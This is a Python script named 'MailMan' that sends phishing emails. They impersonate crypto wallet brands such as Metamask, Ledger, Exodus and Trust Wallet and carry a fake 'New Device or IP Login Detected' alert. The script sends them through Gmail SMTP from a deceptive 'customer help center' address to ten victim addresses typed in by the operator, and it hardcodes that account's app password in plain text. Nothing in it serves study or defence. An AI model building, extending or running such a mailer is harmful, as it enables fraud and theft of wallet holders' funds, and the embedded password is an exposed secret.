import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import re
import random
from datetime import datetime, timedelta
import os


# List of wallet addresses
WALLETS = [
    "Atomic",
    "Bitfrost",
    "Base",
    "Coolwallet",
    "Exodus",
    "Ledger",
    "Metamask",
    "Phantom",
    "Safepal",
    "Trust Wallet"
]


def load_html_template(wallet_name):
    """Load HTML template for the specified wallet"""
    try:
        # Convert wallet name to lowercase and remove spaces for filename
        template_name = wallet_name.lower().replace(" ", "_")
        template_path = os.path.join("templates", f"{template_name}.html")
        
        with open(template_path, 'r', encoding='utf-8') as file:
            return file.read()
    except FileNotFoundError:
        print(f"Error: Template file not found: {template_path}")
        return None
    except Exception as e:
        print(f"Error loading template: {e}")
        return None


def send(wallet, email):
    """Send email with HTML template"""
    try:
        sender_email = "Customerhelpcenterteaminfo@gmail.com"
        sender_password = "agsn hlga hiai ipen"
        
        # Load HTML template
        html_content = load_html_template(wallet)
        if not html_content:
            return False
        
        # Create message
        msg = MIMEMultipart('alternative')
        msg['From'] = sender_email
        msg['To'] = email
        msg['Subject'] = f"[{wallet}] New Device or IP Login Detected on Your Account"
        
        # Attach HTML content
        html_part = MIMEText(html_content, 'html')
        msg.attach(html_part)
        
        # Send email
        #with smtplib.SMTP('smtpout.secureserver.net', 587) as server:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
        
        print(f"Email sent successfully to {email}")
        return True
    except Exception as e:
        print(f"Error sending email: {e}")
        return False


def main():
    print("=== MailMan ===\n")
    
    emails = []
    for i in range(1, 11):
        email = input(f"Enter Client Email {i}: ")
        
        if '@' not in email:
            print(f"Error: Invalid email address for Email {i}. Email must contain '@' sign")
            return
        
        emails.append(email)
    
    print("\nAvailable Wallets:")
    for i, wallet in enumerate(WALLETS, 1):
        print(f"{i}. {wallet}")
    
    try:
        choice = int(input("\nChoose a wallet (1-10): "))
        if 1 <= choice <= 10:
            selected_wallet = WALLETS[choice - 1]
            print(f"Selected: {selected_wallet}\n")
        else:
            print("Error: Please enter a number between 1 and 10")
            return
    except ValueError:
        print("Error: Please enter a valid number")
        return
    
    if emails and selected_wallet:
        print(f"\nEmails: {', '.join(emails)}")
        print(f"Wallet: {selected_wallet}")
        confirm = input("Press y to continue: ")
        if confirm.lower() == 'y':
            for email in emails:
                send(selected_wallet, email)
        else:
            print("Operation cancelled")
    else:
        print("Error: Both email and wallet are required")


if __name__ == "__main__":

    main()

